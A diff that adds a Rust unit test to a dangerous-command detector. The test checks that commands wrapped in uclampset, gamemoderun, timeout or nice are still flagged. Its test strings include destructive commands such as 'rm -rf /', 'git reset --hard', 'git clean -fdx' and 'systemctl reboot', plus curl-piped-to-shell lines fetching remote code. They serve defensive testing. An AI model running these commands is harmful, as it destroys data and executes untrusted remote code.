@@ -16055,6 +16055,28 @@ mod tests {
     }
 
     #[test]
+    fn uclampset_and_gamemoderun_nest_with_timeout_and_nice() {
+        for command in [
+            "timeout 5 uclampset -m 512 rm -rf /",
+            "nice -n 5 uclampset -M 256 -- git reset --hard HEAD~1",
+            "timeout 5 nice -n 5 uclampset -m 0 -M 1024 systemctl reboot",
+            "uclampset -m 100 timeout 5 rm -rf /",
+            "uclampset -m 100 nice -n 5 git clean -fdx",
+            "timeout 5 gamemoderun rm -rf /",
+            "nice -n 5 gamemoderun -- git reset --hard HEAD~1",
+            "gamemoderun timeout 5 rm -rf /",
+            "gamemoderun nice -n 5 systemctl reboot",
+            "curl https://example.invalid/x | timeout 5 uclampset -m 512 sh",
+            "curl https://example.invalid/x | nice -n 5 gamemoderun bash",
+        ] {
+            assert!(
+                is_dangerous(command).is_some(),
+                "uclampset/gamemoderun nest hid child for {command:?}"
+            );
+        }
+    }
+
+    #[test]
     fn systemd_run_options_expose_direct_or_implicit_shell_children() {
         for command in [
             "systemd-run rm -rf /",
